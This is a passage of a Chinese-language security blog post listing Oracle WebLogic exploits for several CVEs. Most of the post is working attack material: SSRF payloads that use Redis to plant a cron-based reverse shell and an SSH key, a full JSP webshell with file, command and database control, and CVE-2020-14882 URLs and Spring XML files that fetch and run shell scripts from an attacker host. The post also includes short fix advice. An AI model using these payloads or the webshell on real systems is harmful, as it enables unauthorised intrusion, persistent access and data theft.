+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;ip:port</code></pre>
+<p>SSRF攻击内网Redis<br>写定时任务</p>
+<pre class="language-none"><code class="language-none">&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator&#x3D;http:&#x2F;&#x2F;ip&#x2F;test%0D%0A%0D%0Aset%20x%20%22%5Cn%5Cn%5Cn%5Cn*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20&gt;%26%20%2Fdev%2Ftcp%2Fvps%2Fport%200&gt;%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2Fcrontabs%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search</code></pre>
+<p>写ssh公钥</p>
+<pre class="language-none"><code class="language-none">uddiexplorer&#x2F;SearchPublicRegistries.jsp?
+operator&#x3D;http:&#x2F;&#x2F;ip&#x2F;test%0D%0A%0D%0Aset%20xx%20%22
+%5Cn%5Cn%5Cn%5Cnssh-rsa
+%20AAAAB3NzaC1yc2EAAAADAQABAAABAQDV14i&#x2F;SITCBQjzb%2B8xL0vwGw
+KjnMEQiarTxdVokFToK0Xw99m0eJwKV3WcTQgSykHA2rFxbQw%2Fv9IVx89bAz
+X0iOBAU8jF%2B9oH5KE9KBzM%2FT1Vr3DDwmNny2qYCfizO9jJ90fr3DUeXWwl
+%2BD24XiKfkDzlDly9LgEYxXl%2FCIgZ91QcTA0UeSBLXCgigVLKhDNZGGBqMF
+rGNUsj0esNJr7pJsYEnIn%2BN5BtnUWEce1KERlGDiwvzRpyFvOKgQpEAiS%2B
+R781GSsAsJsCQz8OFge6lx0iSMNZ6TWjkQYKlnTkQvzOo%2FZhINtItYziRXJK
+mNQLdPpQ7OYo2WOQ4TIDFtR5%20root@iZuf6jc5pa52ijq06q5f1lZ%5Cn%5C
+n%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Froot%2F.ssh%0D%0Acon
+fig%20set%20dbfilename%20authorized_keys%0D%0Asave%0D%0A%0D%0A
+aaa&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfo
+r&#x3D;&amp;selfor&#x3D;Business%2Blocation&amp;btnSubmit&#x3D;Search</code></pre>
+<h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><p>在Weblogic Web Service Test Page中存在一处任意文件上传漏洞，WebService Test Page在”生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限.<br><strong>影响范围</strong><br>Oracle WebLogic Server<br><strong>版本</strong></p>
+<pre class="language-none"><code class="language-none">10.3.6.0
+12.1.3.0
+12.2.1.2
+12.2.1.3</code></pre>
+<p><strong>影响页面</strong></p>
+<pre class="language-none"><code class="language-none">&#x2F;ws_utc&#x2F;config.do
+&#x2F;ws_utc&#x2F;begin.do</code></pre>
+<p><strong>jsp大马</strong></p>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@page import&#x3D;&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;
+&lt;%!
+    String Pwd &#x3D; &quot;Cknife&quot;;
+    String cs &#x3D; &quot;UTF-8&quot;;
+    
+    String EC(String s) throws Exception &#123;
+        return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);
+    &#125;
+    
+    Connection GC(String s) throws Exception &#123;
+        String[] x &#x3D; s.trim().split(&quot;choraheiheihei&quot;);
+        Class.forName(x[0].trim());
+        if(x[1].indexOf(&quot;jdbc:oracle&quot;)!&#x3D;-1)&#123;
+            return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[3]);
+        &#125;else&#123;
+            Connection c &#x3D; DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[&#x2F;null]&quot;)?&quot;&quot;:x[3]);
+            if (x.length &gt; 4) &#123;
+                c.setCatalog(x[4]);
+            &#125;
+            return c;
+        &#125;
+    &#125;
+    
+    void AA(StringBuffer sb) throws Exception &#123;
+        File k &#x3D; new File(&quot;&quot;);
+        File r[] &#x3D; k.listRoots();
+        for (int i &#x3D; 0; i &lt; r.length; i++) &#123;
+            sb.append(r[i].toString().substring(0, 2));
+        &#125;
+    &#125;
+    
+    void BB(String s, StringBuffer sb) throws Exception &#123;
+        File oF &#x3D; new File(s), l[] &#x3D; oF.listFiles();
+        String sT, sQ, sF &#x3D; &quot;&quot;;
+        java.util.Date dt;
+        SimpleDateFormat fm &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
+        for (int i &#x3D; 0; i &lt; l.length; i++) &#123;
+            dt &#x3D; new java.util.Date(l[i].lastModified());
+            sT &#x3D; fm.format(dt);
+            sQ &#x3D; l[i].canRead() ? &quot;R&quot; : &quot;&quot;;
+            sQ +&#x3D; l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;
+            if (l[i].isDirectory()) &#123;
+                sb.append(l[i].getName() + &quot;&#x2F;\t&quot; + sT + &quot;\t&quot; + l[i].length()+ &quot;\t&quot; + sQ + &quot;\n&quot;);
+            &#125; else &#123;
+                sF+&#x3D;l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;+ sQ + &quot;\n&quot;;
+            &#125;
+        &#125;
+        sb.append(sF);
+    &#125;
+    
+    void EE(String s) throws Exception &#123;
+        File f &#x3D; new File(s);
+        if (f.isDirectory()) &#123;
+            File x[] &#x3D; f.listFiles();
+            for (int k &#x3D; 0; k &lt; x.length; k++) &#123;
+                if (!x[k].delete()) &#123;
+                    EE(x[k].getPath());
+                &#125;
+            &#125;
+        &#125;
+        f.delete();
+    &#125;
+    
+    void FF(String s, HttpServletResponse r) throws Exception &#123;
+        int n;
+        byte[] b &#x3D; new byte[512];
+        r.reset();
+        ServletOutputStream os &#x3D; r.getOutputStream();
+        BufferedInputStream is &#x3D; new BufferedInputStream(new FileInputStream(s));
+        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);
+        while ((n &#x3D; is.read(b, 0, 512)) !&#x3D; -1) &#123;
+            os.write(b, 0, n);
+        &#125;
+        os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);
+        os.close();
+        is.close();
+    &#125;
+    
+    void GG(String s, String d) throws Exception &#123;
+        String h &#x3D; &quot;0123456789ABCDEF&quot;;
+        File f &#x3D; new File(s);
+        f.createNewFile();
+        FileOutputStream os &#x3D; new FileOutputStream(f);
+        for (int i &#x3D; 0; i &lt; d.length(); i +&#x3D; 2) &#123;
+            os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i + 1))));
+        &#125;
+        os.close();
+    &#125;
+    
+    void HH(String s, String d) throws Exception &#123;
+        File sf &#x3D; new File(s), df &#x3D; new File(d);
+        if (sf.isDirectory()) &#123;
+            if (!df.exists()) &#123;
+                df.mkdir();
+            &#125;
+            File z[] &#x3D; sf.listFiles();
+            for (int j &#x3D; 0; j &lt; z.length; j++) &#123;
+                HH(s + &quot;&#x2F;&quot; + z[j].getName(), d + &quot;&#x2F;&quot; + z[j].getName());
+            &#125;
+        &#125; else &#123;
+            FileInputStream is &#x3D; new FileInputStream(sf);
+            FileOutputStream os &#x3D; new FileOutputStream(df);
+            int n;
+            byte[] b &#x3D; new byte[512];
+            while ((n &#x3D; is.read(b, 0, 512)) !&#x3D; -1) &#123;
+                os.write(b, 0, n);
+            &#125;
+            is.close();
+            os.close();
+        &#125;
+    &#125;
+    
+    void II(String s, String d) throws Exception &#123;
+        File sf &#x3D; new File(s), df &#x3D; new File(d);
+        sf.renameTo(df);
+    &#125;
+    
+    void JJ(String s) throws Exception &#123;
+        File f &#x3D; new File(s);
+        f.mkdir();
+    &#125;
+    
+    void KK(String s, String t) throws Exception &#123;
+        File f &#x3D; new File(s);
+        SimpleDateFormat fm &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
+        java.util.Date dt &#x3D; fm.parse(t);
+        f.setLastModified(dt.getTime());
+    &#125;
+    
+    void LL(String s, String d) throws Exception &#123;
+        URL u &#x3D; new URL(s);
+        int n &#x3D; 0;
+        FileOutputStream os &#x3D; new FileOutputStream(d);
+        HttpURLConnection h &#x3D; (HttpURLConnection) u.openConnection();
+        InputStream is &#x3D; h.getInputStream();
+        byte[] b &#x3D; new byte[512];
+        while ((n &#x3D; is.read(b)) !&#x3D; -1) &#123;
+            os.write(b, 0, n);
+        &#125;
+        os.close();
+        is.close();
+        h.disconnect();
+    &#125;
+    
+    void MM(InputStream is, StringBuffer sb) throws Exception &#123;
+        String l;
+        BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(is));
+        while ((l &#x3D; br.readLine()) !&#x3D; null) &#123;
+            sb.append(l + &quot;\r\n&quot;);
+        &#125;
+    &#125;
+    
+    void NN(String s, StringBuffer sb) throws Exception &#123;
+        Connection c &#x3D; GC(s);
+        ResultSet r &#x3D; s.indexOf(&quot;jdbc:oracle&quot;)!&#x3D;-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();
+        while (r.next()) &#123;
+            sb.append(r.getString(1) + &quot;\t|\t\r\n&quot;);
+        &#125;
+        r.close();
+        c.close();
+    &#125;
+    
+    void OO(String s, StringBuffer sb) throws Exception &#123;
+        Connection c &#x3D; GC(s);
+        String[] x &#x3D; s.trim().split(&quot;choraheiheihei&quot;);
+        ResultSet r &#x3D; c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!&#x3D;-1?x.length&gt;5?x[5]:x[4]:null, &quot;%&quot;, new String[]&#123;&quot;TABLE&quot;&#125;);
+        while (r.next()) &#123;
+            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t|\t\r\n&quot;);
+        &#125;
+        r.close();
+        c.close();
+    &#125;
+    
+    void PP(String s, StringBuffer sb) throws Exception &#123;
+        String[] x &#x3D; s.trim().split(&quot;\r\n&quot;);
+        Connection c &#x3D; GC(s);
+        Statement m &#x3D; c.createStatement(1005, 1007);
+        ResultSet r &#x3D; m.executeQuery(&quot;select * from &quot; + x[x.length-1]);
+        ResultSetMetaData d &#x3D; r.getMetaData();
+        for (int i &#x3D; 1; i &lt;&#x3D; d.getColumnCount(); i++) &#123;
+            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)+ &quot;)\t&quot;);
+        &#125;
+        r.close();
+        m.close();
+        c.close();
+    &#125;
+    
+    void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;
+        Connection c &#x3D; GC(s);
+        Statement m &#x3D; c.createStatement(1005, 1008);
+        BufferedWriter bw &#x3D; null;
+        try &#123;
+            ResultSet r &#x3D; m.executeQuery(q.indexOf(&quot;--f:&quot;)!&#x3D;-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);
+            ResultSetMetaData d &#x3D; r.getMetaData();
+            int n &#x3D; d.getColumnCount();
+            for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;
+                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);
+            &#125;
+            sb.append(&quot;\r\n&quot;);
+            if(q.indexOf(&quot;--f:&quot;)!&#x3D;-1)&#123;
+                File file &#x3D; new File(p);
+                if(q.indexOf(&quot;-to:&quot;)&#x3D;&#x3D;-1)&#123;
+                    file.mkdir();
+                &#125;
+                bw &#x3D; new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!&#x3D;-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;) + 4,q.length()).trim()),true),cs));
+            &#125;
+            while (r.next()) &#123;
+                for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;
+                    if(q.indexOf(&quot;--f:&quot;)!&#x3D;-1)&#123;
+                        bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);
+                        bw.flush();
+                    &#125;else&#123;
+                        sb.append(r.getObject(i)+&quot;&quot; + &quot;\t|\t&quot;);
+                    &#125;
+                &#125;
+                if(bw!&#x3D;null)&#123;bw.newLine();&#125;
+                sb.append(&quot;\r\n&quot;);
+            &#125;
+            r.close();
+            if(bw!&#x3D;null)&#123;bw.close();&#125;
+        &#125; catch (Exception e) &#123;
+            sb.append(&quot;Result\t|\t\r\n&quot;);
+            try &#123;
+                m.executeUpdate(q);
+                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);
+            &#125; catch (Exception ee) &#123;
+                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);
+            &#125;
+        &#125;
+        m.close();
+        c.close();
+    &#125;
+%&gt;
+&lt;%
+ 
+ 
+&#x2F;&#x2F;String Z &#x3D; EC(request.getParameter(Pwd) + &quot;&quot;, cs);
+    
+    cs &#x3D; request.getParameter(&quot;code&quot;) !&#x3D; null ? request.getParameter(&quot;code&quot;)+ &quot;&quot;:cs;
+    request.setCharacterEncoding(cs);
+    response.setContentType(&quot;text&#x2F;html;charset&#x3D;&quot; + cs);
+    StringBuffer sb &#x3D; new StringBuffer(&quot;&quot;);
+if (request.getParameter(Pwd) !&#x3D; null) &#123;
+ 
+    try &#123;
+        String Z &#x3D; EC(request.getParameter(&quot;action&quot;) + &quot;&quot;);
+        String z1 &#x3D; EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;);
+        String z2 &#x3D; EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;);
+        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);
+        String s &#x3D; request.getSession().getServletContext().getRealPath(&quot;&#x2F;&quot;);
+        if (Z.equals(&quot;A&quot;)) &#123;
+            sb.append(s + &quot;\t&quot;);
+            if (!s.substring(0, 1).equals(&quot;&#x2F;&quot;)) &#123;
+                AA(sb);
+            &#125;
+        &#125; else if (Z.equals(&quot;B&quot;)) &#123;
+            BB(z1, sb);
+        &#125; else if (Z.equals(&quot;C&quot;)) &#123;
+            String l &#x3D; &quot;&quot;;
+            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
+            while ((l &#x3D; br.readLine()) !&#x3D; null) &#123;
+                sb.append(l + &quot;\r\n&quot;);
+            &#125;
+            br.close();
+        &#125; else if (Z.equals(&quot;D&quot;)) &#123;
+            BufferedWriter bw &#x3D; new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
+            bw.write(z2);
+            bw.close();
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;E&quot;)) &#123;
+            EE(z1);
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;F&quot;)) &#123;
+            FF(z1, response);
+        &#125; else if (Z.equals(&quot;G&quot;)) &#123;
+            GG(z1, z2);
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;H&quot;)) &#123;
+            HH(z1, z2);
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;I&quot;)) &#123;
+            II(z1, z2);
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;J&quot;)) &#123;
+            JJ(z1);
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;K&quot;)) &#123;
+            KK(z1, z2);
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;L&quot;)) &#123;
+            LL(z1, z2);
+            sb.append(&quot;1&quot;);
+        &#125; else if (Z.equals(&quot;M&quot;)) &#123;
+            String[] c &#x3D; &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;
+            Process p &#x3D; Runtime.getRuntime().exec(c);
+            MM(p.getInputStream(), sb);
+            MM(p.getErrorStream(), sb);
+        &#125; else if (Z.equals(&quot;N&quot;)) &#123;
+            NN(z1, sb);
+        &#125; else if (Z.equals(&quot;O&quot;)) &#123;
+            OO(z1, sb);
+        &#125; else if (Z.equals(&quot;P&quot;)) &#123;
+            PP(z1, sb);
+        &#125; else if (Z.equals(&quot;Q&quot;)) &#123;
+            QQ(cs, z1, z2, sb,z2.indexOf(&quot;-to:&quot;)!&#x3D;-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;, &quot;&#x2F;&quot;)+&quot;images&#x2F;&quot;);
+        &#125;
+    &#125; catch (Exception e) &#123;
+        sb.append(&quot;ERROR&quot; + &quot;:&#x2F;&#x2F; &quot; + e.toString());
+    &#125;
+    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);
+    out.print(sb.toString());
+&#125;
+%&gt;</code></pre>
+<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过T3协议触发，可导致未授权的用户在远程服务器执行任意命令。<br><strong>受影响版本</strong></p>
+<pre class="language-none"><code class="language-none">Weblogic 10.3.6.0
+Weblogic 12.1.3.0
+Weblogic 12.2.1.2
+Weblogic 12.2.1.3</code></pre>
+<p>网上有很多复现文章，这里不复现了。<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/169420.html">https://www.freebuf.com/vuls/169420.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8073?time__1311=n4+xuDgDBADQYAKD=DODlcje0=eYfS7q+ArD&alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/8073?time__1311=n4%2BxuDgDBADQYAKD%3DDODlcje0%3DeYfS7q%2BArD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45744814/article/details/120229347">https://blog.csdn.net/weixin_45744814/article/details/120229347</a><br><strong>漏洞修复</strong></p>
+<ol>
+<li>关闭或控制T3服务的访问权限</li>
+<li>更新补丁</li>
+</ol>
+<h2 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h2><p>由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意HTTP请求，利用该漏洞获取服务器权限，实现远程代码执行.<br><strong>影响版本</strong></p>
+<pre class="language-none"><code class="language-none">Oracle WebLogic Server 10.*
+Oracle WebLogic Server 12.1.3</code></pre>
+<p><strong>影响组件</strong></p>
+<pre class="language-none"><code class="language-none">bea_wls9_async_response.war
+wsat.war</code></pre>
+<p><strong>漏洞判断</strong><br>判断不安全组件是否开启<br>通过访问路径<code>/_async/AsyncResponseService</code><br><strong>漏洞利用</strong><br><a target="_blank" rel="noopener" href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a><br><strong>漏洞修复</strong></p>
+<ol>
+<li>打上官方补丁</li>
+<li>升级本地JDK版本，升级到jdk7u21以上版本可以避免由于java原生类反序列化漏洞造成的RCE</li>
+<li>配置URL访问资源策略</li>
+<li>删除不安全文件，删除wls9_async_response.war与wls-wsat.war文件及相关文件夹并重启Weblogic服务<br>具体文件路径：<br>10.3.*版本<pre class="language-none"><code class="language-none">\Middleware\wlserver_10.3\server\lib\%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\</code></pre>
+12.1.3版本<pre class="language-none"><code class="language-none">Middleware\Oracle_Home\oracle_common\modules\%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\</code></pre></li>
+</ol>
+<h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><p>这个漏洞的利用方式有两种:</p>
+<ol>
+<li>通过<code>com.tangosol.coherence.mvel2.sh.ShellSession执行命令</code><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;whoami&#39;);&quot;)</code></pre>
+这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。<br>反弹shell<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;curl http:&#x2F;&#x2F;vps:port&#x2F;shell.sh -o &#x2F;tmp&#x2F;shell.sh&#39;);&quot;)</code></pre></li>
+</ol>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;139.155.49.43:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;bash&#x2F;tmp&#x2F;shell.sh&#39;);&quot;)</code></pre>
+<ol start="2">
+<li>通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code><br>windows WebLogic Server版本:10.3.6.0</li>
+</ol>
+<p><strong>cmd.xml</strong></p>
+<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
+&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;
+  xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
+xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot; init-method&#x3D;&quot;start&quot;&gt;
+&lt;constructor-arg&gt;
+    &lt;list&gt;
+        &lt;value&gt;cmd&lt;&#x2F;value&gt;
+        &lt;value&gt;&#x2F;c&lt;&#x2F;value&gt;
+        &lt;value&gt;&lt;![CDATA[mshta http:&#x2F;&#x2F;vps:port&#x2F;file.ext]]&gt;&lt;&#x2F;value&gt;
+    &lt;&#x2F;list&gt;
+&lt;&#x2F;constructor-arg&gt;
+&lt;&#x2F;bean&gt;
+&lt;&#x2F;beans&gt;  </code></pre>
+<p><strong>GET</strong>方法:</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;..%2fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http:&#x2F;&#x2F;vps:port&#x2F;cmd.xml&quot;)</code></pre>
+<p><strong>POST</strong>方法:</p>
+<pre class="language-none"><code class="language-none">url：
+http:&#x2F;&#x2F;192.168.78.105:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal
+
+
+body:
+_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http:&#x2F;&#x2F;vps:port&#x2F;cmd.xml&quot;)</code></pre>
+
+<p>Linux WebLogic Server 版本:12.2.1.3</p>
+<p>构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上</p>
+<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
+&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;
+  xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
+xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;
+&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot; init-method&#x3D;&quot;start&quot;&gt;
+&lt;constructor-arg&gt;
+&lt;list&gt;
+&lt;value&gt;bash&lt;&#x2F;value&gt;
+&lt;value&gt;-c&lt;&#x2F;value&gt;
+&lt;value&gt;&lt;!
+[CDATA[curl vps:port&#x2F;shell.sh -o &#x2F;tmp&#x2F;shell.sh]]&gt;&lt;&#x2F;value&gt;
+&lt;&#x2F;list&gt;
+&lt;&#x2F;constructor-arg&gt;
+&lt;&#x2F;bean&gt;
+&lt;&#x2F;beans&gt;</code></pre>
+<p>然后让Weblogic加载XML并执行其中的命令</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;vps:port&#x2F;shell.xml&quot;)</code></pre>
+<p><strong>漏洞修复</strong><br>关闭后台对&#x2F;console&#x2F;console.portal对外访问</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/e9731bcd/" title="Weblogic漏洞">http://ta0.fun/posts/e9731bcd/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/7387f134/" rel="prev" title="HackMyVM-Aurora"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-Aurora</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/2f532906/" rel="next" title="网鼎杯2020玄武组SSRFMe"><span class="post-nav-text">网鼎杯2020玄武组SSRFMe</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
